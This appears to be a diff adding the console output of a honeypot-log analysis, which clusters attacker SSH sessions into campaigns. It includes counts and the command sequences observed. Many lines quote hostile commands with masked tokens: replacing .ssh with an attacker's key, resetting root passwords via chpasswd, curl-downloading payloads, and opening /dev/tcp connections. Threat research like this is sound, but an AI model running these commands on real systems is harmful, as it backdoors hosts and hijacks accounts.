@@ -1,0 +1,46 @@
+nohup: ignoring input
+[+] scanned data/external/cow160/logs_by_day/2025-06-28.json.gz
+[+] scanned data/external/cow160/logs_by_day/2025-07-09.json.gz
+[+] scanned data/external/cow160/logs_by_day/2025-07-22.json.gz
+[+] scanned data/external/cow160/logs_by_day/2025-08-03.json.gz
+[+] scanned data/external/cow160/logs_by_day/2025-08-16.json.gz
+
+sessions with >= 1 input line: 215,833
+label       campaign | reach k=3 (seq>=5)  k=4 (seq>=5)  k=5 (seq>=5)
+exact        164,046 |     977 (  6)       886 (  5)       886 (  5)
+template     185,609 |  13,065 ( 73)    12,974 ( 72)    12,899 ( 70)
+unattributed after templating with >= 3 lines: 3,858 sessions
+
+template campaign sequences reaching line 3: 73 (top 30; full list in template_sequences.csv)
+  602e159e88089fb8 n=11,275 ips=4,292 exact=11023 lines= 18 days=5  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo "root:<TOK>"|chpasswd|bash
+  3ea55076380351f2 n=   830 ips=  242 exact=   1 lines=  9 days=5  /ip cloud print || ifconfig || uname -a || cat /proc/cpuinfo
+  5b386a656b3c9e44 n=    91 ips=   87 exact=   1 lines=  3 days=5  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l
+  01d5a27ce2b7177f n=    80 ips=   76 exact=  80 lines= 19 days=5  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo -e "<TOK>\<TOK>\<TOK>"|passwd|bash
+  ee2e1d08ac191868 n=    76 ips=   72 exact=  76 lines= 19 days=4  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo -e "secret\<TOK>\<TOK>"|passwd|bash
+  253ec182a1670ba2 n=    55 ips=   21 exact=  55 lines=  4 days=5  nohup bash -c "exec <N><>/dev/tcp/<IP>/<N> && echo -n 'GET / || dd bs=<N> <TOK> > <TOK> || nohup bash -c "exec <N><>/dev/tcp/<IP>/<N> && echo -n 'GET / || >D6@/XJ'<N>
+  949e8dc5e22928ea n=    31 ips=    9 exact=   1 lines=  8 days=5  /ip cloud print || ifconfig || uname -a || cat /proc/cpuinfo
+  624ccefa010cbfb6 n=    28 ips=   28 exact=  28 lines= 19 days=5  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo -e "<N>\<TOK>\<TOK>"|passwd|bash
+  2365a245643d3153 n=    26 ips=   26 exact=  26 lines=  5 days=4  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo "root:<TOK>"|chpasswd|bash
+  f184d04142c2fd1f n=    23 ips=   23 exact=  23 lines=  7 days=4  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo "root:<TOK>"|chpasswd|bash
+  e4191ae49473deb1 n=    23 ips=   23 exact=  23 lines= 19 days=4  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo -e "<N>\<TOK>\<TOK>"|passwd|bash
+  104f679186fb7ca9 n=    20 ips=   18 exact=  20 lines=  4 days=4  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo "root:<TOK>"|chpasswd|bash
+  9ddb2c056a46edde n=    19 ips=   19 exact=  19 lines= 19 days=3  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo -e "ubuntu\<TOK>\<TOK>"|passwd|bash
+  ba64515ab7257ad7 n=    19 ips=   17 exact=  19 lines=  6 days=5  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo "root:<TOK>"|chpasswd|bash
+  34a92956298d2ddf n=    16 ips=   12 exact=  16 lines=  5 days=5  echo <N> > /dev/null && cat /bin/echo || nohup $SHELL -c "curl <URL> -o <TOK>; if [ ! -f <TOK> ]; the || head -c <N> > <TOK> || nohup $SHELL -c "curl <URL> -o <TOK>; if [ ! -f <TOK> ]; the
+  0be4e95bf06fc9f2 n=    16 ips=   16 exact=  16 lines= 19 days=4  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo -e "<TOK>\<TOK>\<TOK>"|passwd|bash
+  24ea1d5eab4a0e3d n=    16 ips=    8 exact=  16 lines=  5 days=4  echo <N> && cat /bin/echo || nohup $SHELL -c "curl <URL> -o <TOK>; if [ ! -f <TOK> ]; the || head -c <N> > <TOK> || echo <N> && cat /bin/echoQtd#UPX!
+  31f948551a386c61 n=    15 ips=   15 exact=  15 lines= 16 days=4  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo "root:<TOK>"|chpasswd|bash
+  0aecaf99d579426e n=    15 ips=   15 exact=  15 lines= 17 days=5  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo "root:<TOK>"|chpasswd|bash
+  91e05101d85f1fe0 n=    14 ips=   14 exact=  14 lines= 14 days=5  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo "root:<TOK>"|chpasswd|bash
+  d34fc36c31961537 n=    14 ips=   12 exact=  14 lines= 19 days=2  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo -e "sftp\<TOK>\<TOK>"|passwd|bash
+  b567710fd6febe72 n=    13 ips=   12 exact=   1 lines= 11 days=5  uname -a || hostname || uname -m&&pkill upnpsetup || chmod <N> zsvc
+  a782b8c6d8d0fd89 n=    12 ips=   12 exact=  12 lines= 15 days=5  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo "root:<TOK>"|chpasswd|bash
+  2cbc61c8ebc730a0 n=    12 ips=   10 exact=  12 lines=  9 days=4  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo "root:<TOK>"|chpasswd|bash
+  2bba8b429a1f279e n=    12 ips=   12 exact=  12 lines=  8 days=4  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo "root:<TOK>"|chpasswd|bash
+  943c7dbc72283737 n=    12 ips=   12 exact=  12 lines= 17 days=4  cd ~; chattr -ia .ssh; lockr -ia .ssh || cat /proc/cpuinfo | grep name | wc -l || echo "root:<TOK>"|chpasswd|bash || rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -<N> secur
+  2db9ae9f1b2f0f80 n=    11 ips=    8 exact=  11 lines=  5 days=5  echo <N> > /dev/null && cat /bin/echo || nohup $SHELL -c "curl <URL> -o <TOK>; if [ ! -f <TOK> ]; the || head -c <N> > <TOK> || nohup $SHELL -c "curl <URL> -o <TOK>; if [ ! -f <TOK> ]; the
+  da91558d78214d2e n=    11 ips=   11 exact=  11 lines= 10 days=4  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo "root:<TOK>"|chpasswd|bash
+  175a92305f75e9d2 n=    11 ips=   11 exact=  11 lines= 13 days=4  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo "root:<TOK>"|chpasswd|bash
+  c95f19c1c0d6f17d n=    10 ips=   10 exact=  10 lines= 11 days=4  cd ~; chattr -ia .ssh; lockr -ia .ssh || cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa <TOK> mdr || cat /proc/cpuinfo | grep name | wc -l || echo "root:<TOK>"|chpasswd|bash
+
+[+] reports/diagnostics/template_sessions.csv  template_sequences.csv  template_summary.json
